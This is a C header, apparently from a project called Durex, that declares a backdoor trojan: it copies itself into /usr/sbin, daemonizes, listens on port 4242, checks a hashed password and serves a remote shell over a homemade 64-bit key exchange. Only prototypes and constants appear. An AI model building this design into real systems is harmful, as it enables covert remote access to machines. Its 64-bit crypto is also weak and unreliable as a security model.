#ifndef DUREX_H
# define DUREX_H

# include <limits.h>
# include <stdio.h>
# include <unistd.h>
# include <signal.h>
# include <string.h>
# include <stdlib.h>
# include <dirent.h>
# include <fcntl.h>
# include <time.h>
# include <sys/stat.h>
# include <sys/file.h>
# include <sys/types.h>
# include <sys/socket.h>
# include <sys/select.h>
# include <sys/stat.h>
# include <sys/wait.h>
# include <netinet/in.h>
# include <arpa/inet.h>
# include <math.h>
# include <stdint.h>
# include "rj.h"

# define RUN_DIR			"/"
# define TARGET_DIR			"/usr/sbin"
# define TARGET_FILE		"/usr/sbin/Durex"
# define LOCK_DIR			"/var/lock"
# define LOCK_FILE			"/var/lock/durex.lock"
# define LOG_DIR			"/var/log/durex"
# define LOG_FILE			"/var/log/durex/durex.log"
# define SERVER_PORT		4242
# define MAX_CLIENTS		3

# define FALSE				0
# define TRUE				1

# define LOG_USER			"[ USER ]"
# define LOG_ERROR			"[ ERROR ]"
# define LOG_INFO			"[ INFO ]"
# define LOG_SIGNAL			"[ SIGNAL ]"
# define LOG_SHELL			"[ SHELL ]"
# define LOG_DEBUG			"[ DEBUG ]"

# define LOGIN_PENDING		1
# define LOGIN_GRANTED		2
# define LOGIN_REFUSED		3

# define MSG_ERROR			1
# define MSG_ERROR_FORK		11
# define MSG_ERROR_PIPE		12
# define MSG_DISCONNECT		2
# define MSG_LOGIN_OK		3
# define MSG_LOGIN_KO		4
# define MSG_COMMAND		5
# define MSG_QUIT			6

typedef struct				s_client
{
	int						sock;
	int						log;
	int						shell;
  	uint64_t                                	p;
	uint64_t                                	g;
	uint64_t					shared_key;
	uint64_t                                	a;
	uint64_t                                	x;
	uint64_t                                	y;
	int						is_key;
	rijn_keysched_t					*sched;
	pid_t						pid;
  
	struct s_client					*next;
}							t_client;

typedef struct				s_daemon
{
	pid_t					pid;
	int						lock;
	int						sock;
	t_client				*clt;
}							t_daemon;

/*
** Client
*/
t_client					*client_new(int sock);
int							client_add(t_client **head, t_client *node);
void						client_free(t_client **node);
void						client_ofree(t_client **head, int sock);
void						client_lfree(t_client **head);

/*
** Daemon
*/
void						signal_setup(void);
void						signal_handler(int sig);

int							checkpath(void);
int							replicate(void);
void						daemonize(void);

void						set_lock(void);
int							unset_lock(void);

int							server_create(void);
int							server_destroy(void);
int							server_handle_connections(void);
int							server_handle_message(t_client *client);
unsigned int				server_hashpass(const char *key, size_t len);
int							server_login(char *key, size_t len);

int							daemon_report(const char *type, const char *log);

/*
** Remote shell
*/
void						shell_sigchld_handler(int sig);
void						shell_master(t_client *client);
void						shell_parent(int pipe_in[], int pipe_out[], t_client *client);
void						shell_child(int pipe_in[], int pipe_out[]);

/*
 * Keys
 */
void init_key(t_client *c);
int handle_keys(unsigned char *buf, t_client *c);
int is_prime(int num);
uint64_t powmodp(uint64_t a, uint64_t b, uint64_t P);
uint64_t    ft_atollu(const char *str);
char    *ft_itoa_a(uint64_t value, int base);

#endif
